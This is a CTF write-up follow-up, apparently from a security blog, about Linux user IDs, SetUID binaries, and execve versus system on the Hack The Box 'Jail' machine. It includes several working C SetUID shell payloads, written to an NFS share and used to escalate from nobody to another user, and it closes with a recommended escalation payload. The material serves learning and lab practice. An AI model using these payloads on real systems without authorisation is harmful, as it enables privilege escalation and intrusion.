# SetUID Rabbit Hole

[ctf](/tags#ctf ) [htb-jail](/tags#htb-jail ) [suid](/tags#suid )
[linux](/tags#linux ) [execve](/tags#execve ) [c](/tags#c ) [nfs](/tags#nfs )
[setuid](/tags#setuid ) [seteuid](/tags#seteuid ) [setresuid](/tags#setresuid
)  
  
May 31, 2022

  * [HTB: Jail](/2022/05/23/htb-jail.html)
  * SetUID Rabbithole

![setuid-rabbit-cover](https://0xdfimages.gitlab.io/img/setuid-rabbit-
cover.png)

In looking through writeups for Jail after finishing mine, I came across an
interesting rabbit hole, which led me down the path of a good deal of
research, where I learned interesting detail related to a few things I’ve been
using for years. I’ll dive into Linux user IDs and SetUID / SUID, execve vs
system, and sh vs bash, and test out what I learn on Jail.

## Background

### Issue From Jail

On Jail, I am able to get both a shell as nobody and NFS access. With that NFS
access, I can write a SetUID binary as Frank and then execute it to get a
shell as frank. I used [this payload](/2022/05/23/htb-jail.html#nfs-setuid):

    
    
    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>
    
    int main(void) {
        setresuid(1000, 1000, 1000);
        system("/bin/bash");
        return 0;
    }
    

I didn’t think much of it at the time, but I got a bit lucky. I noticed in
[IppSec’s walkthrough](https://www.youtube.com/watch?v=80-73OYcrrk&t=2040s)
that he had some issues with this, and very similar payload:

    
    
    int main(void)
    {
        setuid(1000);
        setgid(1000);
        system("id");
    }
    

When he runs this, even as a SUID binary owned by frank (user id 1000), it
shows the nobody user.

Most other writeups I looked at used the same payload I did, without any
explanation. Many also used `execve("/bin/bash", NULL, NULL)` instead of
`system` (which is safer).

This all inspired me to go into a bit of a rabbit hole, and it turns out there
are a few interesting details of how Linux act under the hood that I learned.
To follow this, I’ll need background on three different areas:

  * Linux user ids;
  * Starting processes in Linux, `execve` vs`system`;
  * `sh`, `bash`, and dropping privileges.

### Linux User IDs

#### ruid, euid, suid

Every linux process tracks three userids. The real user ID (`ruid`, or often
referred to as just `uid`) is the id of the user who started the process.

The effective user ID (`euid`) is what the system looks to when deciding what
privileges the process should have. In most cases, the `euid` will be the same
as the `ruid`, but a SetUID binary is an example of a case where they differ.
When a SetUID binary starts, the `euid` is set to the owner of the file, which
allows these binaries to function.

The saved user ID (`suid`, not to be confused with a SUID binary, which is
short hand for SetUID binaries) is used when a privileged process (most cases
running as root) needs to drop privileges to do some behavior, but needs to
then come back to the privileged state.

If a non-root process wants to change it’s `euid`, it can only set it to the
current values of `ruid`, `euid`, or `suid`. The `suid` allows a user to start
a SetUID process as root, and then that process can drop to a non-privileged
user, and still return to root.

#### set*uid

On first look, it’s easy to think that the system calls `setuid` would set the
`ruid`. In fact, when for a privileged process, it does. But in the general
case, it actually sets the `euid`. From the [man
page](https://man7.org/linux/man-pages/man2/setuid.2.html):

> setuid() sets the effective user ID of the calling process. If the calling
> process is privileged (more precisely: if the process has the CAP_SETUID
> capability in its user namespace), the real UID and saved set-user-ID are
> also set.

So in the case where you’re running `setuid(0)` as root, this is sets all the
ids to root, and basically locks them in (because `suid` is 0, it loses the
knowledge or any previous user - of course, root processes can change to any
user they want).

Two less common syscalls, `setreuid` (`re` for real and effective) and
`setresuid` (`res` includes saved) set the specific ids. Being in an
unprivileged process limits these calls (from [man
page](https://man7.org/linux/man-pages/man2/setresuid.2.html) for `setresuid`,
though the [page](https://man7.org/linux/man-pages/man2/setreuid.2.html) for
`setreuid` has similar language):

> An unprivileged process may change its real UID, effective UID, and saved
> set-user-ID, each to one of: the current real UID, the current effective
> UID, or the current saved set-user-ID.
>
> A privileged process (on Linux, one having the CAP_SETUID capability) may
> set its real UID, effective UID, and saved set- user-ID to arbitrary values.

It’s important to remember that these aren’t here as a security feature, but
rather reflect the intended workflow. When a program wants to change to
another user, it changes the effective userid so it can act as that user.

As an attacker, it’s easy to get in a bad habit of just calling `setuid`
because the most common case is to go to root, and in that case, `setuid` is
effectively the same as `setresuid`.

### Execution

#### execve (and other execs)

The `execve` system call executes a program specified in the first argument.
The second and third arguments are arrays, the arguments (`argv`) and the
environment (`envp`). There are several other system calls that are based on
`execve`, referred to as `exec` ([man page](https://man7.org/linux/man-
pages/man3/exec.3.html)). They are each just wrappers on top of `execve` to
provide different shorthands for calling `execve`.

There’s a ton of detail on the [man page](https://man7.org/linux/man-
pages/man2/execve.2.html), for how it works. In short, when `execve` starts a
program, it uses the same memory space as the calling program, replacing that
program, and newly initiating the stack, heap, and data segments. It wipes out
the code for the program and writes the new program into that space.

So what happens to `ruid`, `euid`, and `suid` on a call to `execve`? It does
not change the metadata associated with the process. The man page explicitly
states:

> The process’s real UID and real GID, as well as its supplementary group IDs,
> are unchanged by a call to execve().

There’s a bit more nuance to the `euid`, with a longer paragraph describing
what happens. Still, it’s focused on if the new program has the SetUID bit
set. Assuming that isn’t the case, then the `euid` is also unchanged by
`execve`.

The `suid` is copied from the `euid` when `execve` is called:

> The effective user ID of the process is copied to the saved set- user-ID;
> similarly, the effective group ID is copied to the saved set-group-ID. This
> copying takes place after any effective ID changes that occur because of the
> set-user-ID and set-group-ID mode bits.

#### system

`system` is a [completely different approach](https://man7.org/linux/man-
pages/man3/system.3.html) to starting a new process. Where `execve` operates
at the process level within the same process, `system` uses `fork` to create a
child process and then executes in that child process using `execl`:

>
>     execl("/bin/sh", "sh", "-c", command, (char *) NULL);
>  

`execl` is just a wrapper around `execve` which converts string arguments into
the `argv` array and calls `execve`. It’s important to note that `system` uses
`sh` to call the command.

### sh and bash SUID

`bash` has a `-p` option, which the [man
page](https://linux.die.net/man/1/bash) describes as:

> Turn on _privileged_ mode. In this mode, the **$ENV** and **$BASH_ENV**
> files are not processed, shell functions are not inherited from the
> environment, and the **SHELLOPTS** , **BASHOPTS** , **CDPATH** , and
> **GLOBIGNORE** variables, if they appear in the environment, are ignored. If
> the shell is started with the effective user (group) id not equal to the
> real user (group) id, and the **-p** option is not supplied, these actions
> are taken and the effective user id is set to the real user id. If the
> **-p** option is supplied at startup, the effective user id is not reset.
> Turning this option off causes the effective user and group ids to be set to
> the real user and group ids.

In short, without `-p`, `euid` is set to `ruid` when Bash is run. `-p`
prevents this.

The `sh` shell doesn’t have a feature like this. The [man
page](https://man7.org/linux/man-pages/man1/sh.1p.html) doesn’t mention “user
ID”, other than with the `-i` option, which says:

> -i Specify that the shell is interactive; see below. An implementation may
> treat specifying the -i option as an error if the real user ID of the
> calling process does not equal the effective user ID or if the real group ID
> does not equal the effective group ID.

## Testing On Jail

### setuid / system

With all of that background, I’ll take this code and walk through what happens
on Jail:

    
    
    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>
    
    int main(void) {
        setuid(1000);
        system("id");
        return 0;
    }
    

This program is compiled and set as SetUID on Jail over NFS:

    
    
    oxdf@hacky$ gcc a.c -o /mnt/nfsshare/a;
    ...[snip]...
    oxdf@hacky$ chmod 4755 /mnt/nfsshare/a
    

As root, I can see this file:

    
    
    [root@localhost nfsshare]# ls -l a 
    -rwsr-xr-x. 1 frank frank 16736 May 30 04:58 a
    

When I run this as nobody, `id` runs as nobody:

    
    
    bash-4.2$ $ ./a
    uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
    

The program starts with a `ruid` of 99 (nobody) and an `euid` of 1000 (frank).
When it reaches the `setuid` call, those same values are set.

Then `system` is called, and I would expect to see `uid` of 99, but also an
`euid` of 1000. Why isn’t there one? The issue is that `sh` is symlinked to
`bash` in this distribution:

    
    
    $ ls -l /bin/sh
    lrwxrwxrwx. 1 root root 4 Jun 25  2017 /bin/sh -> bash
    

So `system` calls `/bin/sh sh -c id`, which is effectively `/bin/bash bash -c
id`. When `bash` is called, with no `-p`, then it sees `ruid` of 99 and `euid`
of 1000, and sets `euid` to 99.

### setreuid / system

To test that theory, I’ll try replacing `setuid` with `setreuid`:

    
    
    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>
    
    int main(void) {
        setreuid(1000, 1000);
        system("id");
        return 0;
    }
    

Compile and permissions:

    
    
    oxdf@hacky$ gcc b.c -o /mnt/nfsshare/b; chmod 4755 /mnt/nfsshare/b
    

Now on Jail, now `id` returns uid of 1000:

    
    
    bash-4.2$ $ ./b
    uid=1000(frank) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
    

The `setreuid` call set both `ruid` and `euid` to 1000, so when `system`
called `bash`, they matched, and things continued as frank.

### setuid / execve

Calling `execve` If my understanding above is correct, I could also not worry
about messing with the uids, and instead call `execve`, as that will carry
though the existing IDs. That will work, but there are traps. For example,
common code might look like this:

    
    
    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>
    
    int main(void) {
        setuid(1000);
        execve("/usr/bin/id", NULL, NULL);
        return 0;
    }
    

Without the environment (I’m passing NULL for simplicity), I’ll need a full
path on `id`. This works, returning what I expect:

    
    
    bash-4.2$ $ ./c
    uid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
    

The `[r]uid` is 99, but the `euid` is 1000.

If I try to get a shell from this, I have to be careful. For example, just
calling `bash`:

    
    
    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>
    
    int main(void) {
        setuid(1000);
        execve("/bin/bash", NULL, NULL);
        return 0;
    }
    

I’ll compile that and set it SetUID:

    
    
    oxdf@hacky$ gcc d.c -o /mnt/nfsshare/d
    oxdf@hacky$ chmod 4755 /mnt/nfsshare/d
    

Still, this will return all nobody:

    
    
    bash-4.2$ $ ./d
    bash-4.2$ $ id
    uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
    

If it were `setuid(0)`, then it would work fine (assuming the process had
permission to do that), as then it changes all three ids to 0. But as a non-
root user, this just sets the `euid` to 1000 (which is already was), and then
calls `sh`. But `sh` is `bash` on Jail. And when `bash` starts with `ruid` of
99 and `euid` of 1000, it will drop the `euid` back to 99.

To fix this, I’ll call `bash -p`:

    
    
    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>
    
    int main(void) {
        char *const paramList[10] = {"/bin/bash", "-p", NULL};
        setuid(1000);
        execve(paramList[0], paramList, NULL);
        return 0;
    }
    

This time the `euid` is there:

    
    
    bash-4.2$ $ ./e
    bash-4.2$ $ id
    uid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
    

Or I could call `setreuid` or `setresuid` instead of `setuid`.

## Conclusion

The fact is, for most cases, all of this nuance doesn’t matter. If it’s SetUID
for root, `setuid` does what I want. If `sh` isn’t symlinked to `bash`, I
don’t have to worry about dropping privs. Still, it’s good to understand
what’s happening in a program like this. I would recommend, based on this
research, using the basic SUID code, updating the program / parameters to be
call as well as the id:

    
    
    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>
    
    int main(void) {
        char *const paramList[10] = {"/bin/bash", "-p", NULL};
        const int id = 1000;
        setresuid(id, id, id);
        execve(paramList[0], paramList, NULL);
        return 0;
    }
    

`setresuid` with `execve` leaves the least room for unexpected behavior.

[« HTB: Jail](/2022/05/23/htb-jail.html)

[](/2022/05/31/setuid-rabbithole.html)

